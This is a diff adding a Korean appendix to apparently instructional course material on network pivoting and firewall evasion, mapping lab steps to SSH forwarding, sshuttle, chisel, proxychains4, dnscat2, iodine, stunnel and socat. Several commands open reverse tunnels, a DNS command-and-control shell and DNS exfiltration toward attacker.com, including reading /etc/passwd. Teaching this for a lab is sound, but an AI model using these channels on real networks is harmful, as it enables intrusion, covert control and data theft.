@@ -835,3 +835,262 @@ graph LR
 
 **학생 액션**: lab 3-hop pivot.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 03 네트워크 우회)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 |
+|------|----------|---------|------|
+| s1 | SSH local forward | OpenSSH `-L` | `ssh -L 1234:internal:80 user@jump` |
+| s2 | SSH dynamic SOCKS | OpenSSH `-D` | `ssh -D 1080 user@jump` |
+| s3 | SSH ProxyJump | OpenSSH `-J` | `ssh -J jump1,jump2 internal-host` |
+| s4 | sshuttle (VPN-like) | sshuttle | `sshuttle -r user@jump 10.0.0.0/24` |
+| s5 | chisel HTTP tunnel | chisel | `chisel server -p 8000 --reverse` |
+| s6 | proxychains | proxychains4 | `proxychains4 nmap -sT 10.0.0.5` |
+| s7 | dnscat2 (DNS C2) | dnscat2 | `ruby dnscat2.rb attacker.com` |
+| s8 | iodine (DNS tunnel) | iodine | `sudo iodine -P pwd t.attacker.com` |
+
+### 학생 환경 준비
+
+```bash
+# === SSH (이미 설치) ===
+ssh -V
+
+# === sshuttle (가장 단순한 VPN-like) ===
+sudo apt install -y sshuttle
+
+# === chisel (Go, HTTP tunnel) ===
+go install github.com/jpillora/chisel@latest
+# 또는:
+curl -sSL https://i.jpillora.com/chisel | bash
+
+# === proxychains4 ===
+sudo apt install -y proxychains4
+
+# === dnscat2 ===
+git clone https://github.com/iagox86/dnscat2 ~/dnscat2
+# Server (Ruby): cd ~/dnscat2/server && bundle install
+sudo apt install -y ruby-bundler
+cd ~/dnscat2/server && bundle install
+
+# Client (C): cd ~/dnscat2/client && make
+cd ~/dnscat2/client && make
+
+# === iodine ===
+sudo apt install -y iodine
+
+# === stunnel (TLS wrapper) ===
+sudo apt install -y stunnel4
+
+# === socat (다목적 relay) ===
+sudo apt install -y socat
+```
+
+### SSH 우회 패턴 (5 종)
+
+```bash
+# === 1. Local Forward (-L) ===
+# attacker → jump.example.com 통해 internal:80 접근
+ssh -L 8080:internal-host:80 user@jump.example.com
+
+# 이제 attacker 의 localhost:8080 → internal-host:80
+curl http://localhost:8080
+
+# === 2. Dynamic SOCKS (-D) — 가장 유연 ===
+ssh -D 1080 user@jump.example.com
+
+# 이제 SOCKS5 proxy 1080 → jump.example.com
+proxychains4 nmap -sT 10.0.0.0/24                       # 내부망 스캔
+firefox --proxy-server="socks://localhost:1080"          # 브라우저 통해
+
+# === 3. Remote Forward (-R) — reverse tunnel ===
+# 침투한 host 에서 attacker 로 callback
+ssh -R 9090:localhost:22 attacker@external.com
+# attacker 의 localhost:9090 → 침투한 host 의 22
+ssh -p 9090 user@localhost                              # attacker 가 침투한 host 의 22 로 SSH
+
+# === 4. ProxyJump (-J) — 다중 hop ===
+ssh -J jump1,jump2,jump3 user@deep-internal-host
+
+# === 5. ProxyCommand (advanced) ===
+ssh -o "ProxyCommand=ssh user@jump nc %h %p" user@internal-host
+```
+
+### sshuttle (가장 단순한 transparent proxy)
+
+```bash
+# === 1. 단순 사용 (root 권한 — iptables 자동 변경) ===
+sudo sshuttle -r user@jump.example.com 10.0.0.0/24
+
+# 이제 모든 10.0.0.x 트래픽이 자동으로 jump 통해 라우팅
+# 원래처럼 사용:
+nmap -sT 10.0.0.5                                       # 자동 tunnel
+curl http://10.0.0.10/                                  # 자동 tunnel
+
+# === 2. DNS 도 tunnel ===
+sudo sshuttle -r user@jump --dns 10.0.0.0/24
+
+# === 3. 다중 subnet ===
+sudo sshuttle -r user@jump 10.0.0.0/8 192.168.0.0/16
+
+# === 4. 종료 ===
+# Ctrl-C → iptables 자동 복원
+```
+
+### chisel (HTTP tunnel — 외부 firewall 우회)
+
+```bash
+# === Scenario: 침투한 내부 host 의 SOCKS 통해 attacker 가 내부망 접근 ===
+
+# 1) Attacker (외부, 80/443 만 허용 환경) — Server 시작
+chisel server -p 443 --reverse \
+    --auth user:pass
+
+# 2) 침투한 내부 host — Client (reverse tunnel)
+chisel client http://attacker.com:443 \
+    --auth user:pass \
+    R:1080:socks
+
+# 3) Attacker 측 — SOCKS proxy 사용
+proxychains4 nmap -sT 10.0.0.0/24                       # attacker 의 1080 → 침투 host 의 모든 네트워크
+
+# === HTTP 만 허용된 환경에서 효과적 ===
+# - SSH 차단 + HTTP 허용 → chisel HTTP/S 가 통과
+# - WebSocket fallback 자동
+```
+
+### proxychains4 (다중 SOCKS 체인)
+
+```bash
+# /etc/proxychains4.conf
+sudo tee /etc/proxychains4.conf << 'PEOF'
+strict_chain                                           # 모든 proxy 통과 강제
+proxy_dns
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 1080                                 # SSH dynamic
+socks5 internal-jump.local 1080                       # 두 번째 hop
+PEOF
+
+# 사용
+proxychains4 nmap -sT -Pn 10.0.0.5                    # 모든 traffic SOCKS chain 통과
+proxychains4 ssh user@deep-internal                    # 다중 hop
+proxychains4 sqlmap -u "http://internal/?q=test"
+```
+
+### dnscat2 (DNS C2 — 가장 은닉)
+
+```bash
+# === Scenario: DNS 만 외부 허용된 환경에서 C2 ===
+
+# 1) 도메인 NS 설정 (실제로는 attacker 가 등록한 도메인)
+# attacker.com 의 NS 가 attacker server 를 가리키게 설정
+
+# 2) Server (attacker)
+ruby ~/dnscat2/server/dnscat2.rb attacker.com \
+    --secret=mysecret
+
+# 출력:
+# New session established: 12345
+# 모든 DNS query 가 attacker 에 도달
+
+# 3) Client (target)
+~/dnscat2/client/dnscat \
+    --secret=mysecret \
+    --dns server=8.8.8.8,domain=attacker.com
+
+# 4) Attacker 측 (interactive shell)
+dnscat2> sessions
+dnscat2> session -i 1
+session 1> shell
+new windows... (#1)
+session 1> window -i 1
+shell #1> ls
+shell #1> cat /etc/passwd
+```
+
+### iodine (DNS tunnel — 풀 IP traffic)
+
+```bash
+# === Scenario: 외부 인터넷 모두 차단, DNS 만 허용 ===
+
+# 1) 도메인 NS 설정
+# t.attacker.com 의 NS → attacker IP
+
+# 2) Server (attacker)
+sudo iodined -f -c -P pwd 10.0.0.1 t.attacker.com &
+
+# 3) Client (target)
+sudo iodine -f -P pwd t.attacker.com
+
+# 4) Tunnel 인터페이스 자동 생성
+ip addr show dns0
+# inet 10.0.0.2/27 → 새 IP 할당
+
+# 5) 모든 IP traffic 가 DNS 으로
+# Attacker 의 SSH server 접근 (DNS 으로 wrapping):
+ssh -i key 10.0.0.1                                    # iodine 통해
+
+# 또는 모든 traffic route:
+ip route add default via 10.0.0.1 dev dns0
+```
+
+### stunnel + socat (TLS wrapping)
+
+```bash
+# === stunnel (TCP service 를 TLS 으로 감쌈) ===
+# Server side
+sudo tee /etc/stunnel/stunnel.conf << 'EOF2'
+[http]
+accept = 0.0.0.0:8443
+connect = 127.0.0.1:80
+cert = /etc/stunnel/cert.pem
+EOF2
+
+sudo systemctl restart stunnel4
+
+# Client (any TLS client 으로 8443 접근 → 자동 80 으로 forward)
+
+# === socat (다목적 relay) ===
+# TCP → SSH tunnel
+socat TCP4-LISTEN:9999,fork \
+    OPENSSL-CONNECT:internal:443,verify=0
+
+# Pipe (process 간)
+socat - EXEC:/bin/bash,pty,setsid,stderr
+```
+
+### 우회 도구 비교
+
+| 도구 | 강점 | 약점 | 사용처 |
+|------|------|------|--------|
+| **SSH -D** | 가장 단순, 표준 | SSH 차단 시 무용 | SSH 허용 환경 |
+| **sshuttle** | Transparent (앱 변경 X) | root 필요 | 빠른 임시 access |
+| **chisel** | HTTP tunnel (80/443 만 허용 시) | 추가 binary | 엄격한 firewall |
+| **proxychains4** | 다중 SOCKS chain | 모든 앱 호환 | 분산 IP 사용 |
+| **dnscat2** | DNS 만 허용 시 | 매우 느림, 도메인 필요 | 극단적 격리 |
+| **iodine** | 풀 IP traffic over DNS | 도메인 + NS 필요 | DNS-only 환경 |
+| **stunnel** | TLS wrapping | 양쪽 cert 관리 | TLS 강제 환경 |
+
+### 통합 시나리오 — 다중 hop 침투
+
+```
+[Attacker (external)]
+    ↓ chisel HTTP/443 (외부망 → 내부 침투 host)
+[침투 host #1 (DMZ)]
+    ↓ ssh -D 1080 (DMZ → 내부)
+[Internal jump]
+    ↓ proxychains4 → ssh -J → ...
+[Deep internal target (예: DC)]
+    ↑ exfil
+    ↑ iodine DNS tunnel
+[Attacker (외부)]
+```
+
+학생은 본 3주차에서 **OpenSSH (-L/-D/-J/-R) + sshuttle + chisel + proxychains4 + dnscat2 + iodine + stunnel + socat** 8 도구로 advanced 네트워크 우회 (SSH / SOCKS / HTTP tunnel / DNS tunnel) 의 OSS 표준 흐름을 익힌다.
